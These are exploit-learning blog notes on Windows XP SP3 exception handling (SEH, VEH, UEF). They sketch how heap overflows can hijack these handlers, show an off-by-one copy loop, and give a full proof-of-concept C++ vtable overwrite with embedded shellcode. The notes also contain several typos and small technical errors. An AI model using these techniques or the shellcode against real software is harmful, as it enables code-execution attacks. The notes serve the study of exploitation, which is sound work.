---
title: Exploit learning notes 009 Windows exceptions in depth
description: Deep dive into Windows exception handling, with some other exploits 
date: 2020-10-25 15:09:00+0800
categories:
    - Exploit
tags:
    - Windows
    - ExceptionHandling
---
 
Disclaimer: The experimental environment is Windows XP SP3

Source: [Moeomu's blog](/posts/exploit-learning-notes-009-windows-exceptions-in-depth/)

## Different levels of SEH

- The smallest scope of exception handling is threads, each thread has its own SEH chain and uses its own SEH first when an error occurs
- There may be many threads in a process at the same time, and the process also consists of one that can handle global exception handling. When the thread's own SEH is unable to fix the error, the process's SEH will handle the exception. This exception handling may affect all threads under the process
- The operating system provides a default exception handling function for all programs. When all exception handling functions are unable to handle the error, this default exception handling function will be called eventually and the result will generally be displayed when the error dialog is to be given
- The following is a simple exception handling process
  - First execute the SEH or exception handling function nearest to HANDING in the thread
  - If it fails, try to execute the subsequent exception handling functions in the SEH chain in turn
  - If all the exception handling functions in the SEH chain fail to handle the exception, the exception handling of the process will be executed
  - If it still fails, the system default exception handling function will be called and the program crash dialog will pop up

### Exception handling for threads

> Threads try to handle exceptions sequentially by referring to the SEH chain through the TEB

- The callback function used for exception handling has 4 parameters
  - `pExecpt`: points to an important structure: `EXCEPTION_RECORD`, which contains several exception-related information, such as the type of the exception, the address where the exception occurred, etc.
  - `pFrame`: points to the SEH structure in the stack frame
  - `pContext`: points to the `Context` structure, which contains the state of all registers
  - `pDispatch`: unknown
- Before the callback function is executed, the system stacks the information about the breakpoint when the above exception occurs. With these descriptions, the callback function can easily handle exceptions
- After the callback function returns, the operating system will decide what to do next based on the results returned. Exception handling functions can return two kinds of results
  - `0(Exception Continue Excetutuon)`: means the exception was successfully handled and will return to the place where the exception occurred and continue to execute subsequent instructions
  - `1(Exception Continue Search)`: the exception handling failed, it will search down the SEH chain for other functions that can be used for exception handling and try to handle them
- `UNWIND` operation
  - When an exception occurs, the OS will search the SEH chain for the handle to handle the exception, and once found, the system will call the SEH exception handling functions that have been traversed again.
  - The main purpose is to notify the previous SEHs that failed to handle the exception that the system has abandoned them and ask them to clean up the site to release resources, and then remove the SEH structure from the chain table.
  - When `ExceptionCode` in the `EXCEPTION_RECORD` structure pointed to by `pExcept` is set to `0xC0000027(STATUS_UNWIND)` and `ExceptionFlags` is set to `0x2(EH_UNWINDING)`, the callback function for the call is an `unwind` call
  - This operation is implemented through an export function `RtlUnwind` in `kernel.32`.
  - Before using the callback function, the system will determine if it is currently in debug state, and if it is, it will pass the exception to the debugger

> `EXCEPTION_RECORD`

```CPP
typedef struct _EXCEPTION_RECORD {
    DWORD   ExceptionCode;
    DWORD   ExceptionFlags; //异常标志位
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID   ExceptionAddress;
    DWORD   NumberParameters;
    DWORD   ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];
 } EXCEPTION_RECORD;
```

> `RtlUnwind`

```CPP
void RtlUnwind(
    PVOID               TargetFrame,
    PVOID               TargetIp,
    PEXCEPTION_RECORD   ExceptionRecord,
    PVOID               ReturnValue
);
```

### Process exception handling

> All exceptions that occur in threads that are not handled by the thread or the latter debugger of the exception handling function will eventually be handed over to the process exception handling function

- The callback function for process exception handling needs to be registered through the API function `SetUnhandleExceptionFilter`.
- There are 3 types of return values for this function
  - `1(EXCEPTION_EXECUTE_HANDLER)`: means that the error is handled correctly and the program will exit.
  - `0(EXCEPTION_CONTINUE_SEARCH)`: the error cannot be handled, and the error will be forwarded to the system default exception handling.
  - `-1(EXCEPTION_CONTINUE_EXECUTION)`: indicates that the error was handled correctly and execution will continue. Similar to the threaded exception handling, the system will recover the breakpoint condition at the time of the exception with the parameters of the callback function, but by this time the register value that caused the exception should have been fixed.

> `SetUnhandleExceptionFilter`

```CPP
LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(
 LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter
);
```

### System default exception handling UEF

> If the process exception handler fails or the program has no process exception handler, the system default exception handler `UnhandledExceptionFilter()` will be called, which is the ultimate exception handler `UEF(Unhandled Exception Filter)`.

> MSDN refers to it as the "top-level exception handler", i.e. the top-level exception handler, or the last exception handler used

- In `Windows 2000- Windows XP`, this function will check the contents of the registry `HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug`, the `Auto` item identifies whether the dialog box pops up, `1` means no pop up, just end the program. All others will pop up
- The `Debugger` item specifies the system default debugger

### Summary of exception flow

- CPU executes catching exceptions, kernel takes over control and starts kernel state exception handling
- Kernel exception handling is finished and control is handed over to user state
- The first exception handling function in the user state is the `KiUserExceptionDispatcher()` function in `ntdll.dll`.
- This function first checks if the program is in debug state, and if it is debugged, gives the exception to the debugger to handle
- Try to add `VEH(Vectored Exception Handling)` to handle exceptions
- In non-debugging state, call `RtlDispatchException()` function to iterate through the thread's SEH chain, if the callback function for handling exceptions can be found, it will again iterate through the previously called SEH handle, i.e., unwind operation, to ensure the integrity of the exception handling mechanism
- If all the SEHs in the stack fail, the process has an exception handling function and will call this function
- If the custom process exception handling fails, the system default UEF will be called

## Other exception handling utilization ideas

### VEH utilization

> Starting from `WindowsXP`, a new type of exception handling has been added: `VEH (Vectored Exception Handler)` vectorized exception handling

- VEH and process exception handling is similar, are process-based, need to use the API to register callback functions
- Multiple VEHs can be handled, and the structures are linked in a bidirectional chain.
- Processing priority is second to debugger processing and higher than SEH processing
- Registering a VEH can enforce its position in the chain
- VEHs are stored in the heap
- unwind operation does not involve VEH process class exception handling

> VEH structures

```CPP
struct _VECTORED_EXCEPTION_NODE {
    DWORD m_pNextNode;
    DWORD m_pPreviousNode;
    PVOID m_pfnVectoredHandler;
}
```

> VEH registration function

```CPP
PVOID AddVectoredExceptionHandler(
    ULONG FirstHandler,
    PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
```

- If the heap overflow DWORD SHOOT is used to modify the pointer to the VEH header node, it can lead the program to execute the shellcode after the exception handling starts

### Attack the SEH header node in the TEB

> The SEH chain of the thread points to the closest SEH to the top of the stack through the first DWORD pointer in the TEB. If this pointer in the TEB is modified, it will direct the program to execute the shellcode only when the exception occurs

- Limitations
  - Multiple threads exist in a process
  - Each thread has a TEB
  - The first TEB starts at `0x7FFDE000`
  - The TEB of the new thread will follow the previous TEB, separated by `0x1000` bytes, growing towards the lower address of memory
  - It is difficult for multi-threaded programs to determine which thread is the current thread and where the corresponding TEB is located, and the method of attacking the SEH header node in the TEB is generally used for single-threaded programs

> Although it is possible to create many threads or close a large number of threads to try to control the TEB arrangement, the multi-threaded state should not be obsessed with using the TEB

### Attacking the UEF

> Heap overflow with DOWRD SHOOT target pointing to the entry of the UEF and data being the entry address of the shellcode, then create an exception that can only be handled by the UEF

- Combined with the use of springboard technology can make the success rate of exploit higher
- When an exception occurs, the EDI often points to a place in the heap that is not far from the shellcode
- Overwriting the UEF handle with a `CALL DWORD PTR [EDI + 0x78]` instruction address will often allow the program to jump into the shellcode
- or `CALL DWORD PTR [ESI + 0x4C]` or `CALL DWORD PTR [EBP + 0x74]` will work

### Attack the function pointer in PEB

- ExitProcess() then needs to enter the critical section to synchronize the threads when cleaning up the scene, and will eventually call RtlEnterCriticalSection() and RtlLeaceCriticalSection()
- The address of the PEB is always the same, which is a better choice than the TEB

## `off by one` exploit

> Hierarchy of exploit techniques.
>
> - Basic stack overflow exploit: hijacking the process with the return address
> - Advanced stack overflow exploits: exploits that can only partially flood the EBP but cannot reach the return address, such as the `off by one` exploit that occurs when the strncpy function is misused
> - Heap overflow and format string exploits

### Exploits

> Code snippet

```CPP
void off_by_one(char * input)
{
  char buf[200];
  int i = 0, len = 0;

  len = sizeof(buf);

  for(i = 0; input[i]&&(i <= len); i++)
  {
    buf[i] = input[i];
  }
}
```

- This function tries to prevent array overruns during string copying, but the loop `i <= len` goes wrong in the boundary control and may overflow by one byte
- We can control EBP in the range of 255 bytes and possibly some important parameters of the program

## Attacking C++ virtual functions

### Theory

- A member function of a C++ class is a virtual function if it is modified with the virtual keyword when it is declared
- A class may consist of many virtual functions
- The entry address of the virtual function is stored in the virtual table (Vtable).
- When an object uses a virtual function, it first finds the virtual table by using the virtual table pointer, and then takes the final function entry address from the virtual table to call it
- The pointer to the virtual table is stored in the object's memory space, followed by other member variables
- Dummy functions can only be called dynamically by reference to an object pointer

### Try

- When a member variable in an object overflows, there is an opportunity to modify the virtual table pointer in the object or modify the virtual function pointer in the virtual table
- This makes it possible to execute shellcode

> code attempts

```CPP
/*
Test on Windows XP SP3 without any other patch.
*/

#include "windows.h"
#include "iostream.h"

char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\xAC\xBA\x40\x00"; // set fake virtual function pointer

class Failwest
{
  public:
    char buf[200];
    virtual void test(void)
    {
      cout << "Class Vtable::test()" << endl;
    }
};

Failwest overflow, *p;

void main(void)
{
  char * p_vtable;
  p_vtable = overflow.buf - 4; // point to virtual table
  cout << "Buf Address:" << &overflow.buf << endl;
  // reset fake virtual table to 0x0040BB5C
  // the address may need to ajusted via runtime debug
  p_vtable[0] = 0x5C;
  p_vtable[1] = 0xBB;
  p_vtable[2] = 0x40;
  p_vtable[3] = 0x00;
  strcpy(overflow.buf,shellcode); // set fake virtual function pointer
  p = &overflow;
  p->test();
}
```

### Description

- The dummy table pointer is located before the member variable `char buf[200]`, the program locates this pointer by `p_vtable = overflow.buf - 4`
- Modify the virtual table to point to the buffer `0x0040BB5C`, this is the end of the shellcode, fill in `0x0040BAAC` which is the starting address of the shellcode, the program will jump to execute the shellcode
- This way is neither stack overflow nor heap overflow, because the memory space of the object is located in the heap, but it is a continuous linear overwrite space, so it should be accurately called "array overflow" or "continuous overwrite"
- It may be easier to attack the virtual table using DWORD SHOOT
